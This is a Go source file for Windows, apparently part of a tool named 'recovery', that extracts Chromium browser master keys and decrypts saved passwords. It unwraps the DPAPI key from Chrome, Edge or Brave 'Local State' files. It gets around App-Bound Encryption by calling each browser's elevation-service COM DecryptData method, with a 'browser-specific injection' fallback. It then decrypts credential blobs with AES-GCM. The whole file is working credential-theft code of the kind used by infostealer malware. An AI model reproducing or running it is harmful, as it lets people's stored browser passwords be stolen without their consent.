//go:build windows

package crypto

import (
	"crypto/aes"
	"crypto/cipher"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"os"
	"syscall"
	"unsafe"

	"recovery/recovery/browser"
	"recovery/recovery/platform"
	"recovery/recovery/types"

	"golang.org/x/sys/windows"
)

var (
	modCrypt32             = windows.NewLazySystemDLL("crypt32.dll")
	procCryptUnprotectData = modCrypt32.NewProc("CryptUnprotectData")
)

type dataBlob struct {
	cbData uint32
	pbData *byte
}

func CryptUnprotectData(in []byte) ([]byte, error) {
	var inBlob, outBlob dataBlob
	inBlob.cbData = uint32(len(in))
	if len(in) > 0 {
		inBlob.pbData = &in[0]
	}

	r, _, err := procCryptUnprotectData.Call(
		uintptr(unsafe.Pointer(&inBlob)),
		0, 0, 0, 0, 0,
		uintptr(unsafe.Pointer(&outBlob)),
	)
	if r == 0 {
		return nil, fmt.Errorf("CryptUnprotectData: %w", err)
	}
	defer windows.LocalFree(windows.Handle(uintptr(unsafe.Pointer(outBlob.pbData))))

	out := make([]byte, outBlob.cbData)
	for i := range out {
		out[i] = *(*byte)(unsafe.Pointer(uintptr(unsafe.Pointer(outBlob.pbData)) + uintptr(i)))
	}
	return out, nil
}

var (
	clsidChromeElevator = windows.GUID{
		Data1: 0x708860E0, Data2: 0xF641, Data3: 0x4611,
		Data4: [8]byte{0x88, 0x95, 0x7D, 0x86, 0x7D, 0xD3, 0x67, 0x5B},
	}
	iidChromeElevatorV2 = windows.GUID{
		Data1: 0x1BF5208B, Data2: 0x295F, Data3: 0x4992,
		Data4: [8]byte{0xB5, 0xF4, 0x3A, 0x9B, 0xB6, 0x49, 0x48, 0x38},
	}
	iidChromeElevatorV1 = windows.GUID{
		Data1: 0x463ABECF, Data2: 0x410D, Data3: 0x407F,
		Data4: [8]byte{0x8A, 0xF5, 0x0D, 0xF3, 0x5A, 0x00, 0x5C, 0xC8},
	}
	clsidEdgeElevator = windows.GUID{
		Data1: 0x1FCBE96C, Data2: 0x1697, Data3: 0x43AF,
		Data4: [8]byte{0x91, 0x40, 0x28, 0x97, 0xC7, 0xC6, 0x97, 0x67},
	}
	iidEdgeElevator = windows.GUID{
		Data1: 0xC9C2B807, Data2: 0x7731, Data3: 0x4F34,
		Data4: [8]byte{0x81, 0xB7, 0x44, 0xFF, 0x77, 0x79, 0x52, 0x2B},
	}
	clsidBraveElevator = windows.GUID{
		Data1: 0x576B31AF, Data2: 0x6369, Data3: 0x4B6B,
		Data4: [8]byte{0x85, 0x60, 0xE4, 0xB2, 0x03, 0xA9, 0x7A, 0x8B},
	}
	iidBraveElevatorV2 = windows.GUID{
		Data1: 0x1BF5208B, Data2: 0x295F, Data3: 0x4992,
		Data4: [8]byte{0xB5, 0xF4, 0x3A, 0x9B, 0xB6, 0x49, 0x48, 0x38},
	}
	iidBraveElevatorV1 = windows.GUID{
		Data1: 0xF396861E, Data2: 0x0C8E, Data3: 0x4C71,
		Data4: [8]byte{0x82, 0x56, 0x2F, 0xAE, 0x6D, 0x75, 0x9C, 0xE9},
	}
)

func safeV20KeyViaCOM(cfg types.BrowserConfig, encBlob []byte) (key []byte, err error) {
	defer func() {
		if r := recover(); r != nil {
			err = fmt.Errorf("COM panic: %v", r)
		}
	}()
	return tryV20KeyViaCOM(cfg, encBlob)
}

func tryV20KeyViaCOM(cfg types.BrowserConfig, encBlob []byte) ([]byte, error) {
	hr := coInitializeEx()
	if hr != 0 {
		return nil, fmt.Errorf("CoInitializeEx: 0x%08x", hr)
	}
	defer coUninitialize()

	clsid := clsidChromeElevator
	iid := iidChromeElevatorV2
	if cfg.Name == "Edge" {
		clsid = clsidEdgeElevator
		iid = iidEdgeElevator
	} else if cfg.Name == "Brave" {
		clsid = clsidBraveElevator
		iid = iidBraveElevatorV2
	}

	var unknown *IUnknown
	hr = coCreateInstance(&clsid, nil, 4, &iid, (*unsafe.Pointer)(unsafe.Pointer(&unknown)))
	if hr != 0 && cfg.Name == "Chrome" {
		hr = coCreateInstance(&clsid, nil, 4, &iidChromeElevatorV1, (*unsafe.Pointer)(unsafe.Pointer(&unknown)))
	}
	if hr != 0 && cfg.Name == "Brave" {
		hr = coCreateInstance(&clsid, nil, 4, &iidBraveElevatorV1, (*unsafe.Pointer)(unsafe.Pointer(&unknown)))
	}
	if hr != 0 {
		return nil, fmt.Errorf("CoCreateInstance: 0x%08x", hr)
	}
	defer unknown.Release()

	hr = coSetProxyBlanket(unknown)
	if hr != 0 {
		logf("CoSetProxyBlanket warning: 0x%08x", hr)
	}

	bstrCipher := sysAllocStringByteLen(encBlob)
	if bstrCipher == nil {
		return nil, fmt.Errorf("SysAllocStringByteLen failed")
	}
	defer sysFreeString(bstrCipher)

	var bstrPlain *uint16
	var lastErr uint32
	hr = callDecryptData(unknown, bstrCipher, &bstrPlain, &lastErr)
	if hr != 0 || bstrPlain == nil {
		return nil, fmt.Errorf("DecryptData: 0x%08x (lastError=%d)", hr, lastErr)
	}
	defer sysFreeString(bstrPlain)

	keyLen := sysStringByteLen(bstrPlain)
	if keyLen < 32 {
		return nil, fmt.Errorf("decrypted key too short: %d bytes", keyLen)
	}

	result := make([]byte, 32)
	for i := 0; i < 32; i++ {
		result[i] = *(*byte)(unsafe.Pointer(uintptr(unsafe.Pointer(bstrPlain)) + uintptr(i)))
	}
	return result, nil
}

func coInitializeEx() uint32 {
	r, _, _ := windows.NewLazySystemDLL("ole32.dll").NewProc("CoInitializeEx").Call(0, 2)
	return uint32(r)
}

func coUninitialize() {
	windows.NewLazySystemDLL("ole32.dll").NewProc("CoUninitialize").Call()
}

func coCreateInstance(clsid *windows.GUID, unknown *IUnknown, clsCtx uint32, iid *windows.GUID, ppv *unsafe.Pointer) uint32 {
	r, _, _ := windows.NewLazySystemDLL("ole32.dll").NewProc("CoCreateInstance").Call(
		uintptr(unsafe.Pointer(clsid)),
		uintptr(unsafe.Pointer(unknown)),
		uintptr(clsCtx),
		uintptr(unsafe.Pointer(iid)),
		uintptr(unsafe.Pointer(ppv)),
	)
	return uint32(r)
}

func coSetProxyBlanket(unknown *IUnknown) uint32 {
	r, _, _ := windows.NewLazySystemDLL("ole32.dll").NewProc("CoSetProxyBlanket").Call(
		uintptr(unsafe.Pointer(unknown)),
		0xFFFFFFFF, 0xFFFFFFFF, 0,
		6, 4, 0, 0x400,
	)
	return uint32(r)
}

func sysAllocStringByteLen(b []byte) *uint16 {
	if len(b) == 0 {
		return nil
	}
	r, _, _ := windows.NewLazySystemDLL("oleaut32.dll").NewProc("SysAllocStringByteLen").Call(
		uintptr(unsafe.Pointer(&b[0])),
		uintptr(len(b)),
	)
	return (*uint16)(unsafe.Pointer(r))
}

func sysFreeString(s *uint16) {
	if s != nil {
		windows.NewLazySystemDLL("oleaut32.dll").NewProc("SysFreeString").Call(uintptr(unsafe.Pointer(s)))
	}
}

func sysStringByteLen(s *uint16) int {
	r, _, _ := windows.NewLazySystemDLL("oleaut32.dll").NewProc("SysStringByteLen").Call(uintptr(unsafe.Pointer(s)))
	return int(r)
}

type IUnknown struct {
	vtbl *iUnknownVtbl
}

type iUnknownVtbl struct {
	QueryInterface uintptr
	AddRef         uintptr
	Release        uintptr
}

func (u *IUnknown) Release() {
	syscall.SyscallN(u.vtbl.Release, uintptr(unsafe.Pointer(u)))
}

func callDecryptData(unknown *IUnknown, bstrCipher *uint16, pbstrPlain **uint16, pLastError *uint32) uint32 {
	type elevatorVtbl struct {
		QueryInterface         uintptr
		AddRef                 uintptr
		Release                uintptr
		RunRecoveryCRXElevated uintptr
		EncryptData            uintptr
		DecryptData            uintptr
	}
	vtbl := (*elevatorVtbl)(unsafe.Pointer(unknown.vtbl))
	r, _, _ := syscall.SyscallN(vtbl.DecryptData,
		uintptr(unsafe.Pointer(unknown)),
		uintptr(unsafe.Pointer(bstrCipher)),
		uintptr(unsafe.Pointer(pbstrPlain)),
		uintptr(unsafe.Pointer(pLastError)),
	)
	return uint32(r)
}

func ResolveKeys(cfg types.BrowserConfig) (*types.ResolvedKeys, error) {
	if cfg.IsFirefox {
		return &types.ResolvedKeys{}, nil
	}

	keys := &types.ResolvedKeys{}
	localStatePath := browser.LocalStatePath(cfg)

	data, err := os.ReadFile(localStatePath)
	if err != nil {
		return nil, fmt.Errorf("read Local State: %w", err)
	}

	var localState map[string]interface{}
	if err := json.Unmarshal(data, &localState); err != nil {
		return nil, fmt.Errorf("parse Local State: %w", err)
	}

	osCrypt, _ := localState["os_crypt"].(map[string]interface{})
	if osCrypt == nil {
		return nil, fmt.Errorf("no os_crypt section in Local State")
	}

	if encKey, ok := osCrypt["encrypted_key"].(string); ok && encKey != "" {
		decoded, err := base64.StdEncoding.DecodeString(encKey)
		if err == nil && len(decoded) > 5 && string(decoded[:5]) == "DPAPI" {
			v10Key, err := CryptUnprotectData(decoded[5:])
			if err == nil {
				keys.V10 = v10Key
				logf("resolved V10 (DPAPI) key, %d bytes", len(v10Key))
			} else {
				logf("V10 DPAPI failed: %v", err)
			}
		}
	}

	if appBoundKey, ok := osCrypt["app_bound_encrypted_key"].(string); ok && appBoundKey != "" {
		decoded, err := base64.StdEncoding.DecodeString(appBoundKey)
		if err == nil && len(decoded) > 4 {
			encBlob := decoded[4:]

			var v20Key []byte
			if platform.ActivePipeSession == nil {
				err = fmt.Errorf("no active pipe session")
			} else {
				encB64 := base64.StdEncoding.EncodeToString(encBlob)
				v20Key, err = platform.ActivePipeSession.GetV20Key(cfg.Name, encB64)
			}
			if err != nil {
				if platform.ActivePipeSession == nil {
					if cfg.Name != "Chrome" {
						logf("V20 via pipe failed (%s): %v, falling back to direct COM", cfg.Name, err)
						v20Key, err = safeV20KeyViaCOM(cfg, encBlob)
					} else {
						logf("V20 via pipe failed (Chrome): %v — COM unsafe without browser session, skipping", err)
						err = fmt.Errorf("Chrome V20 requires browser session")
					}
				} else {
					logf("V20 via pipe failed (%s): %v, trying browser-specific injection", cfg.Name, err)
					v20Key, err = platform.TryV20KeyViaBrowserSession(cfg.ProcessName, cfg.Name, encBlob)
					if err != nil {
						logf("browser-specific injection for V20 also failed (%s): %v", cfg.Name, err)
					}
				}
			}
			if err == nil {
				keys.V20 = v20Key
				logf("resolved V20 (App-Bound) key for %s, %d bytes", cfg.Name, len(v20Key))
			} else {
				logf("V20 key unavailable for %s: %v", cfg.Name, err)
			}
		}
	}

	if keys.V10 == nil && keys.V20 == nil {
		return nil, fmt.Errorf("could not resolve any master key")
	}

	return keys, nil
}

func DecryptChromiumBlob(encrypted []byte, v10Key, v20Key []byte) string {
	if len(encrypted) == 0 {
		return ""
	}

	var key []byte
	if len(encrypted) >= 3 {
		switch string(encrypted[:3]) {
		case "v10", "v11":
			key = v10Key
		case "v20":
			key = v20Key
		}
	}

	if key == nil || len(key) == 0 {
		return ""
	}
	if len(encrypted) < 3+12+16 {
		return ""
	}

	nonce := encrypted[3:15]
	tag := encrypted[len(encrypted)-16:]
	ciphertext := encrypted[15 : len(encrypted)-16]

	plaintext, err := aesGCMDecrypt(key, nonce, ciphertext, tag)
	if err != nil {
		return ""
	}
	return CleanPassword(plaintext)
}

func aesGCMDecrypt(key, nonce, ciphertext, tag []byte) ([]byte, error) {
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}
	aesGCM, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}
	ctWithTag := make([]byte, len(ciphertext)+len(tag))
	copy(ctWithTag, ciphertext)
	copy(ctWithTag[len(ciphertext):], tag)
	return aesGCM.Open(nil, nonce, ctWithTag, nil)
}
